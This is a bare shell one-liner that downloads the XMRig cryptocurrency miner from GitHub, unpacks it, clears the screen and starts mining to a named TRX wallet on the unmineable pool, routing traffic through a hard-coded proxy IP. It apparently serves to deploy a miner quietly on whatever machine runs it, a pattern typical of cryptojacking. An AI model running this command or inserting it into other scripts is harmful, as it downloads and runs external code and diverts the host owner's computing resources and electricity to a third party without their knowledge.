wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && \
tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && \
cd xmrig-6.14.1 && \
clear && \
http_proxy=http://190.106.203.86:5678 https_proxy=http://190.106.203.86:5678 ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.v1 -p x
